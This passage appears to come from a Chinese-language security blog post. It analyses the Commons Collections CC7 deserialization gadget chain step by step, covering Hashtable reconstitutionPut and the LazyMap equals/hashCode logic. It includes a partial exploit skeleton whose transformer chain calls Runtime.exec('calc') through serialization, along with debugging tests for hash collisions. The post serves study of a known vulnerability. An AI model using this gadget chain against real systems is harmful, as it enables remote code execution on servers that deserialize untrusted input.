class="variable">key</span> <span class="operator">=</span> e.getKey();</span><br><span class="line">                <span class="type">V</span> <span class="variable">value</span> <span class="operator">=</span> e.getValue();</span><br><span class="line">                <span class="keyword">if</span> (value == <span class="literal">null</span>) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (!(m.get(key)==<span class="literal">null</span> &amp;&amp; m.containsKey(key)))</span><br><span class="line">                        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">if</span> (!value.equals(m.get(key)))<span class="comment">//这里调用了get方法</span></span><br><span class="line">                        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (ClassCastException unused) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NullPointerException unused) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><p>LazyMap的父类AbstractMapDecorator的equals()方法源码：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">equals</span><span class="params">(Object object)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> object == <span class="built_in">this</span> ? <span class="literal">true</span> : <span class="built_in">this</span>.map.equals(object);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></li>
+</ul>
+<p>在Hashtable 的readObject() 方法中用到了for循环，如下：</p>
+<p><img src="/2024/08/13/CC7/image-20240801143656945.png" alt="image-20240801143656945"></p>
+<p>这里的elements代表键值对的个数，这里调用for循环来<strong>一次读取一个键值对</strong>。并且在反序列化过程中，<code>table</code>(也就是reconstitution方法内的tab)是共享的，也就是说在整个反序列化过程中始终使用同一个 <code>tab</code>，所有的键值对都将被插入到同一个 <code>tab</code> 中，构成一个完整的哈希表，并且看Hashtable类中也有这个变量：</p>
+<p><img src="/2024/08/13/CC7/image-20240801164533548.png" alt="image-20240801164533548"></p>
+<p>table在Hastable也是有定义的，结合前面的说明，可以知道在反序列化的时候会将键值对放入到这个数组中，但是这里的table是transient修饰的，导致不会被序列化，那么这是如何解决的呢？重点就是在<code>Hashtable#writeObject()</code>方法，源码如下：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">writeObject</span><span class="params">(java.io.ObjectOutputStream s)</span></span><br><span class="line">            <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        Entry&lt;Object, Object&gt; entryStack = <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">synchronized</span> (<span class="built_in">this</span>) &#123;</span><br><span class="line">            s.defaultWriteObject();</span><br><span class="line"></span><br><span class="line">            s.writeInt(table.length);</span><br><span class="line">            s.writeInt(count);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">index</span> <span class="operator">=</span> <span class="number">0</span>; index &lt; table.length; index++) &#123;</span><br><span class="line">                Entry&lt;?,?&gt; entry = table[index];</span><br><span class="line"></span><br><span class="line">                <span class="keyword">while</span> (entry != <span class="literal">null</span>) &#123;</span><br><span class="line">                    entryStack =</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Entry</span>&lt;&gt;(<span class="number">0</span>, entry.key, entry.value, entryStack);</span><br><span class="line">                    entry = entry.next;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> (entryStack != <span class="literal">null</span>) &#123;</span><br><span class="line">            s.writeObject(entryStack.key);</span><br><span class="line">            s.writeObject(entryStack.value);</span><br><span class="line">            entryStack = entryStack.next;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>在这个writeObject()方法中，定义了一个<code>entryStack</code>用于暂时存储所有的键值对，赋值就是在for循环中，在这个for循环中，遍历<code>table</code>数组的每个<code>Entry</code>对象，将其填入<code>entryStack</code>数组中，最后在while循环中将每个键值对序列化。</p>
+<p><strong>继续看reconstitutionput()方法：</strong></p>
+<p><img src="/2024/08/13/CC7/image-20240801101906268.png" alt="image-20240801101906268"></p>
+<p>这个for循环代码会遍历链表，直到链表末尾。同时在for循环内部，可以看到只要当前节点的哈希值与目标哈希值相等以及当前节点的键与目标键相等就会抛出异常</p>
+<p><strong>所以这个代码的作用就是确保哈希表中不会出现重复的键</strong>。如果在遍历链表过程中发现有节点的哈希值和键都与目标值相同，就会抛出 <code>StreamCorruptedException</code> 异常。这可能用于序列化&#x2F;反序列化过程中，防止数据结构被破坏或出现不一致的情况。</p>
+<p>如果没有重复的键，在这个for循环过后，将会将这个键值对填入到table数组中：</p>
+<p><img src="/2024/08/13/CC7/image-20240801165644341.png" alt="image-20240801165644341"></p>
+<p>既然这里都说明了是利用equal()方法来创建利用链，在这个<code>reconstitutionPut()</code>方法源码中，可以看到在for循环那里要利用到了<code>equals()</code>方法：</p>
+<p><img src="/2024/08/13/CC7/image-20240801170157261.png" alt="image-20240801170157261"></p>
+<p>由于java中的<code>&amp;&amp;</code>有短路求值的特性，必须要前一个条件（e.hash &#x3D;&#x3D; hash）为真，才会进行第二个条件（e.key.equals(key)）的判断。</p>
+<p><strong>所以我们这里至少put进两个键值对</strong>，这样在第二个键值对与第一个键值对比较时才有可能通过第一个条件。</p>
+<p>再结合前面提前给出的类，大概可以知道利用链了，这里将e.key设置为LazyMap类实例，但是LazyMap中并没有直接定义<code>equals()</code>方法（内部类有，但是不能直接调用），这样就会调用LazyMap的父类AbstractMapDecorator的equals()方法：</p>
+<p><img src="/2024/08/13/CC7/image-20240801204147243.png" alt="image-20240801204147243"></p>
+<p>这里的<code>this</code> 关键字在方法中代表当前类的实例，即调用该方法的对象。如果相同就会直接返回ture，否则就会调用后面的。而我们的利用链就是要调用后面的。</p>
+<p>由于我们实例化LazyMap时，都是传入一个HashMap类实例，最终会将AbstractMapDecorator的<code>this.map</code>设置为HashMap类的实例化对象，这样就会调用HashMap类的equals()方法，但是情况同LazyMap一样，会直接调用父类AbstractMap的equals()方法（部分源码）：</p>
+<p><img src="/2024/08/13/CC7/image-20240801204721007.png" alt="image-20240801204721007"></p>
+<p>然后在AbstractMap的equals()方法中调用了get()方法，这就是起点，<strong>并且这里的<code>m</code>就是<code>e.key.equals(key)</code>中的第二个key，所以我们需要传入两个LazyMap实例</strong>。</p>
+<p><strong>大概就是这样了，现在来搓代码。</strong></p>
+<p>综合前面的问题：</p>
+<ul>
+<li>需要传入两个键值对。需要将<code>e.key</code>设置为LazyMap对象，即key都是LazyMap对象</li>
+<li>hash相等问题</li>
+</ul>
+<p>先给个基本盘：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Hashtable;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.Runtime;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Transformer[] fakeTransformer = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>)&#125;;</span><br><span class="line"></span><br><span class="line">        Transformer[] chainpart = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),<span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;),<span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;Runtime.class,<span class="literal">null</span>&#125;),<span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;),<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>)&#125;;</span><br><span class="line"></span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">chain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(fakeTransformer);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">haha</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">lazy</span> <span class="operator">=</span> LazyMap.decorate(haha,chain);</span><br><span class="line">        <span class="type">Hashtable</span> <span class="variable">hashtable</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Hashtable</span>();</span><br><span class="line">        <span class="comment">//这里开始想代码</span></span><br><span class="line">        </span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">x</span> <span class="operator">=</span> ChainedTransformer.class.getDeclaredField(<span class="string">&quot;iTransformers&quot;</span>);</span><br><span class="line">        x.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        x.set(chain,chainpart);</span><br><span class="line"></span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">out</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.ser&quot;</span>));</span><br><span class="line">        out.writeObject(hashtable);</span><br><span class="line">        out.close();</span><br><span class="line"></span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">input</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;ser.ser&quot;</span>));</span><br><span class="line">        input.readObject();</span><br><span class="line">        input.close();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>现在聚焦于readObject()的<code>reconstitutionPut</code>方法：</p>
+<p><img src="/2024/08/13/CC7/image-20240801173418173.png" alt="image-20240801173418173"></p>
+<p>这里要求前面的条件相等，并且后面的<code>e.key</code>需要为LazyMap类实例，那么我就传入两个LazyMap类实例</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"> <span class="type">Transformer</span> <span class="variable">haha0</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>);</span><br><span class="line"><span class="type">Transformer</span> <span class="variable">haha1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>);</span><br><span class="line"><span class="type">Map</span> <span class="variable">hashMap0</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line"><span class="type">Map</span> <span class="variable">lazy0</span> <span class="operator">=</span> LazyMap.decorate(hashMap0,haha0);</span><br><span class="line"><span class="type">Map</span> <span class="variable">hashMap1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line"><span class="type">Map</span> <span class="variable">lazy1</span> <span class="operator">=</span> LazyMap.decorate(hashMap1,haha1);</span><br><span class="line"></span><br><span class="line"><span class="type">Hashtable</span> <span class="variable">haha</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Hashtable</span>();</span><br><span class="line">haha.put(lazy0,<span class="number">1</span>);</span><br><span class="line">haha.put(lazy1,<span class="number">1</span>);</span><br></pre></td></tr></table></figure>
+
+<p>再粘过来Hashtable类的put方法一下：<br><img src="/2024/08/13/CC7/image-20240801184952561.png" alt="image-20240801184952561"></p>
+<p>这样就可以基本说明为什么我可以调用Hashtable的put方法了（需要注意的是第一次put不会触及for循环，因为table无任何条目，第二次put才会开始比较）。</p>
+<p>但是需要注意的是，当我传入了LazyMap实例，无论是反序还是put方法这里，在<code>key.hashCode()</code>都不会是首先调用默认的String.java的hashCode()方法了，由于LazyMap没有定义hashCode方法，这里就会到父类AbstractMapDecorator的hashCode方法：</p>
+<p><img src="/2024/08/13/CC7/image-20240801194715026.png" alt="image-20240801194715026"></p>
+<p>这里就会又到HashMap（HashMap内部类有hashCode，不可用）<strong>父类AbstractMap的hashCode()方法</strong>：<br><img src="/2024/08/13/CC7/image-20240801195406545.png" alt="image-20240801195406545"></p>
+<p>（这里往后的hashCode()方法调用过程是后面的某个测试代码调试出来的，可以先只暂时了解）然后这里调用的hashCode是<code>HashMap</code>内部类<code>Node</code>类的hashCode()方法，如下：</p>
+<p><img src="/2024/08/13/CC7/image-20240801222242418.png" alt="image-20240801222242418"></p>
+<p>然后差不多就到了String.java的hashCode方法：</p>
+<p><img src="/2024/08/13/CC7/image-20240801215613372.png" alt="image-20240801215613372"></p>
+<p>String.java的hashCode()就是用来计算哈希码的。<u>同时注意（重要）</u>：<strong>在上上面那个hashCode()，也就是内部类Node的hashCode()方法对key和value都调用了hashCode()计算哈希码后异或求得值，也就是最终的哈希码，所以对于最终的哈希码我们需要兼顾键和值</strong>。</p>
+<p>————</p>
+<p>结合String.java的hashCode方法，可以知道<strong>AbstractMap的hashCode方法</strong>的作用就是计算哈希码，通过迭代器<strong>遍历每个条目</strong>，调用每个条目的<code>hashCode()</code>方法，然后将得到的哈希码累加到变量<code>h</code>中。最后返回h。</p>
+<p>但是由于我们最开始调用的hashCode()是LazyMap对象，并且由于这个<strong>对象里面并没有存储有键值对</strong>，所以<strong>这里会直接返回0</strong>。</p>
+<p>本来我还以为刚好，这样都返回0的话正好使得<code>e.hash=hash</code>可以成立，但是需要注意的是，当我们在序列化之前调用put()的时候，看put()方法的如下源码：</p>
+<p><img src="/2024/08/13/CC7/image-20240801200313953.png" alt="image-20240801200313953"></p>
+<p>他这里也有个for循环来防止有重复的键，这个代码的作用就是如果条件成立，也就是条目相匹配，就会将条目<code>entry</code>对应的键的value更改为新的value。再来看我们的代码：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"> <span class="type">Transformer</span> <span class="variable">haha0</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>);</span><br><span class="line"><span class="type">Transformer</span> <span class="variable">haha1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>);</span><br><span class="line"><span class="type">Map</span> <span class="variable">hashMap0</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line"><span class="type">Map</span> <span class="variable">lazy0</span> <span class="operator">=</span> LazyMap.decorate(hashMap0,haha0);</span><br><span class="line"><span class="type">Map</span> <span class="variable">hashMap1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line"><span class="type">Map</span> <span class="variable">lazy1</span> <span class="operator">=</span> LazyMap.decorate(hashMap1,haha1);</span><br><span class="line"></span><br><span class="line"><span class="type">Hashtable</span> <span class="variable">haha</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Hashtable</span>();</span><br><span class="line">haha.put(lazy0,<span class="number">1</span>);</span><br><span class="line">haha.put(lazy1,<span class="number">1</span>);</span><br></pre></td></tr></table></figure>
+
+<p><strong>现在的问题就是想这个<code>entry.key.equals(key)</code>是否会通过导致无法正常放入两个键值对。</strong></p>
+<p>直接从第二次放入键值对开始说，这里由于我放入的是LazyMap类实例，本来以为会按照我们前面说的流程走一遍，最后会调用到AbstractMap类的equals()停下，大错特错。看代码</p>
+<p>直接使用如下代码来测试：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span>  &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">haha0</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>);</span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">haha1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">hashMap0</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">lazy0</span> <span class="operator">=</span> LazyMap.decorate(hashMap0,haha0);</span><br><span class="line"></span><br><span class="line">        <span class="type">Map</span> <span class="variable">hashMap1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">lazy1</span> <span class="operator">=</span> LazyMap.decorate(hashMap1,haha1);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(lazy0.equals(lazy1))&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;相等&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//output:相等</span></span><br></pre></td></tr></table></figure>
+
+<p>这里的输出为相等，那这就是说明会进入if条件，导致不能成功放入两个键值对。但是在前面的分析中，如果想要成功构造利用链，那么就<strong>必须是传入两个LazyMap的实例</strong>。所以这里要想如何解决。打断点来调试一下：<br><img src="/2024/08/13/CC7/image-20240802171424683.png" alt="image-20240802171424683"></p>
+<p>直接按照预期进入到LazyMap父类AbstractMapDecorator的equals()方法：<br><img src="/2024/08/13/CC7/image-20240801205912932.png" alt="image-20240801205912932"></p>
+<p>在前面基本流程那里说过，这里就是判断调用这个equals()方法的对象和传入的object引用的对象是否相同，很不巧的是我们都传入了LazyMap对象，导致了这里使得条件成立，返回true。</p>
+<p><strong>但是</strong>，柳暗花明又一村，在调试时，在上面点击下一步后，看：</p>
+<p><img src="/2024/08/13/CC7/image-20240801210157525.png" alt="image-20240801210157525"></p>
+<p>这里还要调用一次size()方法（这个size()方法过后就没按照预期走了），所以这里会调用HashMap的size()方法</p>
+<p><img src="/2024/08/13/CC7/image-20240801211235910.png" alt="image-20240801211235910"></p>
+<p>这个HashMap的size()方法只是返回当前 <code>HashMap</code> 中存储的键值对的总数。</p>
+<p>这里提到了键值对，那么我们添加一个键值对试试，这里直接对LazyMap对象使用put也行，因为LazyMap的父类实现了put方法：<br><img src="/2024/08/13/CC7/image-20240801211625266.png" alt="image-20240801211625266"></p>
+<p>代码如下：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span>  &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">haha0</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>);</span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">haha1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">hashMap0</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">lazy0</span> <span class="operator">=</span> LazyMap.decorate(hashMap0,haha0);</span><br><span class="line">        lazy0.put(<span class="string">&quot;xxx&quot;</span>,<span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Map</span> <span class="variable">hashMap1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">lazy1</span> <span class="operator">=</span> LazyMap.decorate(hashMap1,haha1);</span><br><span class="line">        lazy1.put(<span class="string">&quot;xxx&quot;</span>,<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(lazy0.equals(lazy1))&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;相等&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这次没有输出，说明这里不相同了，不会进入false，也就可以放入两个值了。</p>
+<p>（遗留一个问题吧，不知道为啥这里会直接到size()并且影响判断）</p>
+<p>并且这里在调试时确实可以进入到最后的<code>AbstractMap</code>的<code>equals()</code>方法并且最终成功调用LazyMap的get方法：<br><img src="/2024/08/13/CC7/image-20240802172158779.png" alt="image-20240802172158779"></p>
+<p><strong>问题equals()方法调用解决。</strong></p>
+<p>那么现在我们又需要注意第一个条件，前面是直接设定的没有键值对，但是由于第二个条件的解决办法，导致我们这里必须要思考如何使得hash相同，最后调用的hashCode方法：<br><img src="/2024/08/13/CC7/image-20240801214556431.png" alt="image-20240801214556431"></p>
+<p>接用代码测试看看：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span>  &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">haha0</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>);</span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">haha1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">hashMap0</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">lazy0</span> <span class="operator">=</span> LazyMap.decorate(hashMap0,haha0);</span><br><span class="line">        lazy0.put(<span class="string">&quot;xx&quot;</span>, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Map</span> <span class="variable">hashMap1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">lazy1</span> <span class="operator">=</span> LazyMap.decorate(hashMap1,haha1);</span><br><span class="line">        lazy1.put(<span class="string">&quot;xxxx&quot;</span>, <span class="number">1</span>);</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span>(lazy1.hashCode()==lazy0.hashCode())&#123;</span><br><span class="line">            System.out.println(<span 